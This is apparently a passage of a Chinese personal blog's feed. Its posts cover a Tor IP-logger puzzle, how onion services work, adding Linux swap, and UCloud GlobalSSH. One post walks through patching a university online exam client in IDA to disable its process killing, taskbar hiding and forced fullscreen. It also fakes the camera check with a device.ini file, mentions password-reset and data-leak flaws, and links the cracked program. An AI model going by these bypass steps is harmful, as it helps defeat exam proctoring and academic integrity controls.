relay作为会合节点，并且将这个E类ip地址写在介绍信中发送给介绍节点</p><p>ip logger服务器如果没有怀疑这个E类IP地址，通过tor网络去连接这个会合节点，那在它的exit relay那里一定会连不上这个ip，因为会出现空路由</p><p>所以如果要让连接成功建立，必须让ip logger到会合节点的relay路径中某个relay节点对这个错误的ip进行了更正，最简单的是控制exit relay，检查到最终访问的是错误ip便进行更正</p><p>而这个relay路径中的每个relay都是ip logger自己选择的，所以黑客需要控制tor网络中的大部分relay????这不现实！！！</p><h3 id="不提供onion-service"><a href="#不提供onion-service" class="headerlink" title="不提供onion service"></a>不提供onion service</h3><p>如果ip logger不是提供onion service，而是提供公开的服务，那它记录下来的应该是 黑客选择的exit relay，即使黑客控制了这个relay也没办法伪造ip啊</p><p>所以通过tor的某些机制伪造成这个E类ip不太现实</p><h2 id="路由劫持？"><a href="#路由劫持？" class="headerlink" title="路由劫持？"></a>路由劫持？</h2><p>我对公网的路由不太了解，但是看样子进行路由劫持是有可能的</p><p>如果黑客创建了一条假的路由路径，并在路由途中的某个节点对这个E类ip进行更正，也是有可能的，不过看起来难度很大啊</p><blockquote><p>才疏学浅，文中可能有错误，欢迎指正<br>目前这个问题还在困扰我，如果有大佬知道答案，希望能够告诉我</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天看了一篇文章，文章最后使用IP logger进行钓鱼，最后记录下来的IP地址让我大跌眼镜&lt;/p&gt;
&lt;p&gt;万万没有想到，记录下来的IP地址竟然是是 244.242.105.51&lt;/p&gt;
&lt;img src=&quot;https://cdn.jsdelivr.net/gh/zu1k/
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="tor" scheme="https://blog.lgf.im/tags/tor/"/>
    
      <category term="IP" scheme="https://blog.lgf.im/tags/IP/"/>
    
  </entry>
  
  <entry>
    <title>Tor洋葱服务如何工作</title>
    <link href="https://blog.lgf.im/2020/how-do-onion-service-work.html"/>
    <id>https://blog.lgf.im/2020/how-do-onion-service-work.html</id>
    <published>2020-05-25T06:13:37.000Z</published>
    <updated>2020-06-18T05:55:25.991Z</updated>
    
    <content type="html"><![CDATA[<p>昨天遇到了点问题，为了研究清楚原理，把Tor客户端与服务端通信的具体流程学习了一下，这篇博文写来记录</p><h2 id="通信流程"><a href="#通信流程" class="headerlink" title="通信流程"></a>通信流程</h2><p>这里要描述的通讯是 用户通过 tor浏览器 连接 洋葱服务 的过程</p><p>为了方便表达，这里用Alice表示客户端，Bob表示服务端</p><h3 id="第一步：服务端设置自己的介绍节点"><a href="#第一步：服务端设置自己的介绍节点" class="headerlink" title="第一步：服务端设置自己的介绍节点"></a>第一步：服务端设置自己的介绍节点</h3><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/how-do-onion-service-work/tor-onion-services-1.png" loading="lazy" class="" title="[第一步]"><p>服务端为了不暴漏自己的IP，使用 介绍节点(introduction points) 来转发来自客户端的介绍信</p><p>首先，Bob从 tor中继节点列表 中挑选几个节点来做自己的 介绍节点，然后与它们建立 长连接(long-term circuits)</p><p>这里的长连接是通过tor网络建立起来的，所以是匿名的，介绍节点不会知道Bob的IP</p><p>同时，Bob会给介绍节点发送一个 身份验证密钥(authentication key)，当有客户端连接这个介绍节点时，通过这个密钥便能判断这个连接是否是找Bob的</p><h3 id="第二步：服务端公开自己的信息"><a href="#第二步：服务端公开自己的信息" class="headerlink" title="第二步：服务端公开自己的信息"></a>第二步：服务端公开自己的信息</h3><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/how-do-onion-service-work/tor-onion-services-2.png" loading="lazy" class="" title="[第二步]"><p>Bob 生成一个 描述信息(onion service descriptor)，里面存储了介绍节点列表，包括介绍节点的ip和相应的身份验证密钥</p><p>然后Bob用自己的私钥对这个消息签名，并将这个消息发布到Tor的DHT中</p><p>经过这步操作，tor客户端便可以通过某个key从DHT中获取到这个消息，从而找到Bob的介绍节点</p><h3 id="第三步：客户端获取介绍节点列表"><a href="#第三步：客户端获取介绍节点列表" class="headerlink" title="第三步：客户端获取介绍节点列表"></a>第三步：客户端获取介绍节点列表</h3><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/how-do-onion-service-work/tor-onion-services-3.png" loading="lazy" class="" title="[第三步]"><p>Alice（客户端）从某些途径知道Bob有一个洋葱服务，并且知道这个服务的onion域名，例如 xyz.onion，此时Alice想要访问Bob.</p><p>首先，她向DHT网络请求该域名对应的信息，也就是第二步中Bob发布的那个描述消息</p><p>获取到消息后，Alice对其签名进行验证，验证使用的Bob的公钥其实已经被编码到 xyz.onion 这个域名中了，Alice可以从域名中解码出来</p><p>消息没问题，Alice从消息中解析出Bob的介绍节点列表，选择其中一个介绍节点，Alice将要向Bob介绍自己</p><h3 id="第四步：客户端选择一个会合节点"><a href="#第四步：客户端选择一个会合节点" class="headerlink" title="第四步：客户端选择一个会合节点"></a>第四步：客户端选择一个会合节点</h3><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/how-do-onion-service-work/tor-onion-services-4.png" loading="lazy" class="" title="[第四步]"><p>Alice从tor中继节点列表中选择一个节点作为 会合节点(rendezvous point)，然后通过tor与该 会合节点(RP) 建立连接</p><p>同时，Alice会给会合节点发送一个 一次性密码(one-time secret)，这个密码会在回合过程中使用</p><h3 id="第五步：客户端向服务端介绍自己"><a href="#第五步：客户端向服务端介绍自己" class="headerlink" title="第五步：客户端向服务端介绍自己"></a>第五步：客户端向服务端介绍自己</h3><p>Alice生成一个消息，包含 会合节点 和 一次性密码，然后用Bob的公钥对消息进行加密</p><p>Alice通过Tor网络连接上 Bob 的一个介绍节点，让该介绍节点把加密后的消息转发给Bob</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/how-do-onion-service-work/tor-onion-services-5.png" loading="lazy" class="" title="[第五步]"><h3 id="第六步：服务端与客户端回合"><a href="#第六步：服务端与客户端回合" class="headerlink" title="第六步：服务端与客户端回合"></a>第六步：服务端与客户端回合</h3><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/how-do-onion-service-work/tor-onion-services-6.png" loading="lazy" class="" title="[第六步]"><p>此时Bob已经收到介绍节点转发过来的消息，知道Alice想要访问自己，并且知道了会合节点的信息</p><p>Bob通过Tor网络连接会合节点，然后将收到的一次性密码发送给会合节点，会合节点由此知道 Bob是要与Alice通信，从而可以将Alice与Bob的消息进行中继</p><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>客户端与服务端最终是通过会合节点通讯的，他们都各自通过tor网络分别连接会合节点，因此既能够保证客户端的隐匿性又能够保证服务端不暴露</p><p>在上面流程中的所有通讯都是用过tor网络建立的，包括 服务端与介绍节点的通讯、客户端与介绍节点的通讯、客户端与会合节点的通讯、服务端与会合节点的通讯</p><p>因此，正常情况下tor客户端与洋葱服务通讯是经过6次中转的，包括客户端连接会合节点的3次和服务端连接会合节点的3次</p><p>如果tor客户端访问的服务不是洋葱服务，那通讯过程就不是上面那个流程了，也只有3次中转了</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://community.torproject.org/onion-services/overview/" target="_blank" rel="noopener">https://community.torproject.org/onion-services/overview/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天遇到了点问题，为了研究清楚原理，把Tor客户端与服务端通信的具体流程学习了一下，这篇博文写来记录&lt;/p&gt;
&lt;h2 id=&quot;通信流程&quot;&gt;&lt;a href=&quot;#通信流程&quot; class=&quot;headerlink&quot; title=&quot;通信流程&quot;&gt;&lt;/a&gt;通信流程&lt;/h2&gt;&lt;p&gt;这里要描
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="tor" scheme="https://blog.lgf.im/tags/tor/"/>
    
      <category term="onion" scheme="https://blog.lgf.im/tags/onion/"/>
    
  </entry>
  
  <entry>
    <title>逆向破解学校在线考试客户端</title>
    <link href="https://blog.lgf.im/2020/crack-sdu-online-exam-software.html"/>
    <id>https://blog.lgf.im/2020/crack-sdu-online-exam-software.html</id>
    <published>2020-05-01T13:44:54.000Z</published>
    <updated>2020-06-18T05:55:25.983Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期，学校开始测试线上考试系统，据说十分流氓，开搞！</p><p>从大一学弟那里拿到了相关程序和说明文档，经过学弟的使用体验，程序开始运行会自动杀死QQ、微信等程序，隐藏并屏蔽任务栏和开始菜单，强制全屏并屏蔽一些常用的快捷键包括窗口切换等。</p><h2 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>在虚拟机里安装程序后，先观察一下安装目录结构和里面的文件</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/1.png" loading="lazy" class="" title="[安装目录结构]"><p>仔细查看了各个文件夹下的内容，最终得出结论，是个QT编写的套壳浏览器，用的 QtWebEngine</p><p>查看主程序的信息，32位未加壳C++程序，本身非常小，只有不到1M，大部分功能应该都是调库实现的</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/2.png" loading="lazy" class="" title="[查看主程序PE信息]"><p>下面开始逆向，拖入IDA 32位，自动定位到入口函数start，从执行流图中可以看到程序本身结构非常简单</p><h3 id="正着走"><a href="#正着走" class="headerlink" title="正着走"></a>正着走</h3><p>下面从start开始分析</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/3.png" loading="lazy" class="" title="[start函数汇编]"><p>可以看到一开始start函数的栈指针分析就出问题了，但是start本身的调用非常简单，不妨来看一下<br>首先是 第一个call指令，进入这个函数</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/4.png" loading="lazy" class="" title="[start第一个call]"><p>发现是 security_cookie检查，没有什么实际作用</p><p>第二个是个无条件跳转 jmp，进去看一下</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/5.png" loading="lazy" class="" title="[start第二个jmp]"><p>可以看到这一段东西比较多，特别是各种不知道什么作用的call非常多，并且自动反编译出问题了，这个反编译问题应该是比较好解决的，我没有深究</p><p>简单看了一下调用的call，越深入越复杂，到这里分析不下去了，东西有点多，从其他方面入手</p><h3 id="去除杀进程"><a href="#去除杀进程" class="headerlink" title="去除杀进程"></a>去除杀进程</h3><p>先来看一下字符串，很幸运字符串没有进行加密，因为我们知道程序会杀死qq，不如直接来搜索关键字QQ</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/6.png" loading="lazy" class="" title="[string搜索qq]"><p>看一下交叉引用</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/7.png" loading="lazy" class="" title="[交叉引用]"><p>只有一个函数调用了它，先进入看看这个函数，关键部分如下</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/8.png" loading="lazy" class="" title="[引用该处的函数]"><p>这就比较清楚了，程序是通过QProcess调用taskkill命令来强制来杀死这些程序的，会被杀死的程序包括实时聊天软件qq、微信，远程协助软件teamviwer、向日葵远程控制。</p><p>在这里我们需要去除这个杀死进程的机制，直接将执行的命令字符串给清空就行</p><h3 id="去除隐藏任务栏"><a href="#去除隐藏任务栏" class="headerlink" title="去除隐藏任务栏"></a>去除隐藏任务栏</h3><p>同时这段命令所在的这个函数在前面还有一堆对QtWebEngine的初始化</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/9.png" loading="lazy" class="" title="[QtWebEngine的初始化]"><p>这个函数后面的部分有点意思，看到了一些字符串不清楚什么意思</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/10.png" loading="lazy" class="" title="[有意思的代码]"><p>我个人对tray比较敏感，因为做过任务栏图标程序的开发，知道任务栏的英文是tray</p><p>这里对 Shell_TrayWhd 进行搜索</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/11.png" loading="lazy" class="" title="[系统特殊窗口句柄]"><p>发现windows系统有一些特殊的窗口句柄，而这个正式任务栏窗口句柄</p><p>一开始我还对这个考试程序怎么隐藏任务栏感兴趣，现在都一目了然了，先通过系统函数获得句柄，然后调用ShowWindow将窗口设置为不显示</p><p>这里的ProgMan是任务管理器，所以说这段代码同时屏蔽了任务栏、开始菜单和任务管理器</p><p>我们需要去除这种屏蔽机制，这也非常简单，来看汇编</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/12.png" loading="lazy" class="" title="[汇编]"><p>发现在调用showwindow前需要将参数 True or False push入栈，也就是 call ShowWindow前面的push 0，只需要修改这几处汇编即可</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/13.png" loading="lazy" class="" title="[IDA中进行patch]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/14.png" loading="lazy" class="" title="[push 1]"><p>将push 0修改为push 1即可去除他的屏蔽(后面的分析知道 push 5 比较好)</p><h3 id="去除强制全屏"><a href="#去除强制全屏" class="headerlink" title="去除强制全屏"></a>去除强制全屏</h3><p>下面我们来去除一下窗口全屏，虽然有任务栏可以用了，但是全屏会挡住，不好用</p><p>还是刚刚那个函数，通过不断查交叉应用，最后定位到start第二次jmp后的代码中</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/15.png" loading="lazy" class="" title="[回到开始]"><p>通过前面对前前后后的call和跳转的分析，可以知道没有啥具体内容，所以还得从刚刚的那个函数入手</p><p>发现后面有一个call</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/16.png" loading="lazy" class="" title="[后面的一个call]"><p>进入后</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/17.png" loading="lazy" class="" title="[恢复任务栏]"><p>发现这个函数是要将之前设置的任务栏隐藏等给还原，所以这里应该是要退出了，重要的内容还是在杀死qq的那些操作和这个函数中间的位置</p><p>仔细分析后，找到了关键的地方</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/18.png" loading="lazy" class="" title="[关键call]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/19.png" loading="lazy" class="" title="[resize]"><p>这和函数在最后面会获取主屏幕的长和宽，然后调用resize函数设置窗口大小，从而使窗口占满屏幕</p><p>这里看一下汇编</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/20.png" loading="lazy" class="" title="[汇编]"><p>其实还是比较难搞的，东西比较紧凑，没法插入太多的汇编，又不想进行大改增加一个call，那就只把开始菜单的地方留出来吧，也就是只修改窗口的高</p><p>因为需要先把高入栈，所以前面的宽先存到 esi，我们先不要动这个，先把高减一个数然后push进去再push esi，修改之后如下</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/21.png" loading="lazy" class="" title="[修改后]"><p>这样显示的窗口就不会挡住任务栏，我们就可以切换窗口了</p><h3 id="恢复窗口和按钮"><a href="#恢复窗口和按钮" class="headerlink" title="恢复窗口和按钮"></a>恢复窗口和按钮</h3><p>后来又想，如果可以手动修改窗口大小就好了，再有个放大、缩小的按钮并且能移动位置就更爽了，那就接着搞</p><p>之前做过qt的开发，知道有一个窗口属性是可以隐藏系统窗口，只显示里面的内容从而使窗口无法修改大小和移动位置</p><p>搜索一番后发现使用的使 setWindowFlags 函数来实现的，那就从imports里面找一下吧</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/22.png" loading="lazy" class="" title="[imports里找修改窗口属性的函数]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/23.png" loading="lazy" class="" title="[函数的交叉引用]"><p>看交叉引用然后一个一个进去看，最后定位到一个函数，我给他起名 initWindowsComponent，前面的分析我也都相应的进行改名了，分析起来方便记忆</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/24.png" loading="lazy" class="" title="[引用的函数]"><p>我这个起名应该是非常贴切了，的确是往窗口里面添加各种菜单按钮组件</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/25.png" loading="lazy" class="" title="[调用的地方]"><p>在后面找到了setWindowFlags调用，但是因为qt里面用的是枚举类型，编译后都变成数字了，只能去看qt的源码</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/26.png" loading="lazy" class="" title="[qt源码]"><p>传入的枚举类型使WindowsFlags类型，跟进去后发现又是一个WindowType类型</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/27.png" loading="lazy" class="" title="[跟进qt源码]"><p>再接着跟进，就看到了全部的内容</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/28.png" loading="lazy" class="" title="[枚举类型]"><p>2048换成16进制是0x800</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/29.png" loading="lazy" class="" title="[0x800]"><p>根据代码是无边框类型</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/30.png" loading="lazy" class="" title="[Fameless]"><p>我们需要的是有边框有放大缩小和关闭按钮，所以需要的类型是</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/31.png" loading="lazy" class="" title="[需要的类型]"><p>此时还没有关闭按钮，根据计算方式，还需要或上关闭按钮的值</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/32.png" loading="lazy" class="" title="[关闭按钮的值]"><p>修改这个参数后窗口就可以随意移动、修改大小、缩小或者全屏了。</p><h3 id="绕过摄像头检查"><a href="#绕过摄像头检查" class="headerlink" title="绕过摄像头检查"></a>绕过摄像头检查</h3><p>我们还知道这个程序还必须要摄像头检查通过，通过简单的实验，发现摄像头只需要检查通过一次，后面不会重复检查，只会读取device.ini文件，所以我们增加这个文件，并手动指定检查通过</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/33.png" loading="lazy" class="" title="[device.ini]"><p>同时通过搜索字符串查看交叉引用可以找到需要读取或者写入文件的地方，这里没有深入研究了，谁敢兴趣谁去研究</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/crack-sdu-online-exam-software/34.png" loading="lazy" class="" title="[device.ini交叉引用]"><h3 id="其他地方"><a href="#其他地方" class="headerlink" title="其他地方"></a>其他地方</h3><p>在对这个程序探究的过程中，还发现了tab栏和menu栏可以打开显示，但是实际作用不大，就没有管。</p><p>同时通过burp抓包和测试，找到了在线考试的登录接口并发现普通浏览器可以正常使用</p><p>同时通过对相关接口的测试，找到了任意密码修改和个人信息泄露的漏洞</p><h2 id="申明与文件"><a href="#申明与文件" class="headerlink" title="申明与文件"></a>申明与文件</h2><p>同时本次研究完全以学习为目的，不得将上述内容用作商业或非法，否则一切后果由用户负责。您必须在下载后的24个小时之内，从您的电脑中彻底删除上述内容。</p><p>破解之后的程序 <a href="/2020/crack-sdu-online-exam-software/%E7%BA%BF%E4%B8%8A%E8%80%83%E8%AF%95.zip" title="[点击下载]">[点击下载]</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;近期，学校开始测试线上考试系统，据说十分流氓，开搞！&lt;/p&gt;
&lt;p&gt;从大一学弟那里拿到了相关程序和说明文档，经过学弟的使用体验，程序开始运行
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
      <category term="reverse" scheme="https://blog.lgf.im/tags/reverse/"/>
    
      <category term="sdu" scheme="https://blog.lgf.im/tags/sdu/"/>
    
      <category term="crack" scheme="https://blog.lgf.im/tags/crack/"/>
    
  </entry>
  
  <entry>
    <title>Linux添加swap</title>
    <link href="https://blog.lgf.im/2020/linux-add-swap.html"/>
    <id>https://blog.lgf.im/2020/linux-add-swap.html</id>
    <published>2020-04-12T12:38:26.000Z</published>
    <updated>2020-06-18T05:55:25.995Z</updated>
    
    <content type="html"><![CDATA[<p>给 linux 服务器添加swap做了好几次了，每一次都没记住，临时去网上查命令，这里特地记录一下</p><h2 id="查看当前swap"><a href="#查看当前swap" class="headerlink" title="查看当前swap"></a>查看当前swap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo swapon --show</span><br></pre></td></tr></table></figure><p>如果没有输出说明没有swap</p><p>也可以通过free命令来查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free -h</span><br></pre></td></tr></table></figure><h2 id="添加swap"><a href="#添加swap" class="headerlink" title="添加swap"></a>添加swap</h2><p>添加swap基本步骤： 创建一个大文件 -&gt; 初始化文件为swap交换文件格式 -&gt; 启用这个文件</p><h3 id="创建大文件"><a href="#创建大文件" class="headerlink" title="创建大文件"></a>创建大文件</h3><p>先找一个剩余空间大点的地方创建一个大文件，这里以1G的大小为例，一般swap空间大小以真实物理内存1-2倍大小</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我喜欢用的方法，速度快</span></span><br><span class="line">sudo fallocate -l 1G /swapfile</span><br><span class="line"><span class="comment"># 如果没有安装可以用dd命令，比较慢</span></span><br><span class="line">sudo dd <span class="keyword">if</span>=/dev/zero of=/swapfile bs=1024 count=1048576</span><br></pre></td></tr></table></figure><p>修改文件的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 600 /swapfile</span><br></pre></td></tr></table></figure><h3 id="初始化文件"><a href="#初始化文件" class="headerlink" title="初始化文件"></a>初始化文件</h3><p>创建完文件后需要将文件进行初始化，标记为swap文件格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkswap /swapfile</span><br></pre></td></tr></table></figure><h3 id="启用swap"><a href="#启用swap" class="headerlink" title="启用swap"></a>启用swap</h3><p>接下来使用 命令启用这个swap交换文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo swapon /swapfile</span><br></pre></td></tr></table></figure><p>要让创建好的 swap 分区永久生效，可以将 swapfile 路径内容写入到 <code>/etc/fstab</code> 文件当中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/swapfile swap swap defaults 0 0</span><br></pre></td></tr></table></figure><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>用一开始的命令检查一下swap是否启用正常</p><h2 id="移除SWAP分区"><a href="#移除SWAP分区" class="headerlink" title="移除SWAP分区"></a>移除SWAP分区</h2><p>根据添加的顺序反着来就行： 取消swap -&gt; 删除swap分页文件</p><h3 id="取消swap"><a href="#取消swap" class="headerlink" title="取消swap"></a>取消swap</h3><p>首先输入以下命令停用 SWAP 空间：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo swapoff -v /swapfile</span><br></pre></td></tr></table></figure><p>在 <code>/etc/fstab</code> 文件中删除有效 swap 的行。</p><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>最后执行以下命令删除 swapfile 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /swapfile</span><br></pre></td></tr></table></figure><h2 id="调整Swappiness值"><a href="#调整Swappiness值" class="headerlink" title="调整Swappiness值"></a>调整Swappiness值</h2><p>Swappiness 是一个 Linux 内核属性，用于定义 Linux 系统使用 SWAP 空间的频率。Swappiness 值可以从 0 至 100，较低的值会让内核尽可能少的使用 SWAP 空间，而较高的值将让 Linux Kernel 能够更加积极地使用 SWAP 分区。</p><p>Ubuntu 18.04 默认的 Swappiness 值为 60，您可以使用如下命令来查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/vm/swappiness</span><br></pre></td></tr></table></figure><p>值为 60 对于 Ubuntu 18.04 桌面还算行，但对于 Ubuntu Server 来说，SWAP 的使用频率就比较高了，所以您可能需要设置较低的值。例如，要将 swappiness 值设置为 40，请执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl vm.swappiness=40</span><br></pre></td></tr></table></figure><p>如果要让设置在系统重启后依然有效，则必要在 /etc/sysctl.conf 文件中添加以下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.swappiness=40</span><br></pre></td></tr></table></figure><p>最佳 swappiness 值取决于您系统的工作负载以及内存的使用方式，您应该以小增量的方式来调整此参数，以查到最佳值。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;给 linux 服务器添加swap做了好几次了，每一次都没记住，临时去网上查命令，这里特地记录一下&lt;/p&gt;
&lt;h2 id=&quot;查看当前swap&quot;&gt;&lt;a href=&quot;#查看当前swap&quot; class=&quot;headerlink&quot; title=&quot;查看当前swap&quot;&gt;&lt;/a&gt;查看当前s
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="linux" scheme="https://blog.lgf.im/tags/linux/"/>
    
      <category term="swap" scheme="https://blog.lgf.im/tags/swap/"/>
    
  </entry>
  
  <entry>
    <title>使用GlobalSSH服务加速境外服务器ssh访问</title>
    <link href="https://blog.lgf.im/2020/use-ucloud-globalssh-to-speedup-server-ssh.html"/>
    <id>https://blog.lgf.im/2020/use-ucloud-globalssh-to-speedup-server-ssh.html</id>
    <published>2020-04-12T08:37:56.000Z</published>
    <updated>2020-06-18T05:55:26.003Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="UCloud已经对加速IP进行限制，本文中的方法即时失效"><a href="#UCloud已经对加速IP进行限制，本文中的方法即时失效" class="headerlink" title="UCloud已经对加速IP进行限制，本文中的方法即时失效"></a>UCloud已经对加速IP进行限制，本文中的方法即时失效</h3><p>通知内容如下：<br>尊敬的UCloud用户，您好！<br>GlobalSSH产品即日起将暂时限制服务器IP地址范围，<br>仅允许添加UCloud平台上的IP地址，已创建的资源仍然可继续使用。<br>GlobalSSH版本与功能支持将持续更新，敬请关注。   </p></blockquote><p>由于众所周知的原因，很多国外的服务器在国内的访问效果很差，特别是国内比较热门的廉价服务器例如 Vultr 就经常被墙直接无法访问</p><p>通常情况下我会使用ssr等代理服务进行中转，在我经常使用的 MobaXterm 中设置起来也非常方便</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/use-ucloud-globalssh-to-speedup-server-ssh/mobaxterm-socks-http.jpg" loading="lazy" class="" title="[给连接设置代理]"><p>但是这种方法有两大劣势：</p><ol><li>如果科学上网服务器不稳定经常断流就会导致ssh连接断开</li><li>部分客户端不支持设置http或者socks代理</li></ol><h2 id="GlobalSSH"><a href="#GlobalSSH" class="headerlink" title="GlobalSSH"></a>GlobalSSH</h2><p>今天发现了一个免费的加速服务，非常方便，推荐给需要的人</p><p>这就是 UCloud 免费提供的 GlobalSSH 加速服务</p><p>官网链接： <a href="https://console.ucloud.cn/upathx/globalssh" target="_blank" rel="noopener">https://console.ucloud.cn/upathx/globalssh</a></p><p>官方文档： <a href="https://docs.ucloud.cn/pathx/globalssh" target="_blank" rel="noopener">https://docs.ucloud.cn/pathx/globalssh</a></p><p>这项服务目前是免费的，<del>也不需要进行实名认证</del> 现在需要实名认证才能用了，可以说是非常良心了，经过我的试用，访问速度和稳定性非常不错</p><p>支持ssh和rdp远程桌面，猜测有一些其他的服务可以加速，因为是针对端口加速的，但是如果滥用的话可能被封禁</p><p>在创建的时候只需要输入需要加速的国外服务器的ip和服务端口号，选择一个离服务器近的接入点</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/use-ucloud-globalssh-to-speedup-server-ssh/position.jpg" loading="lazy" class="" 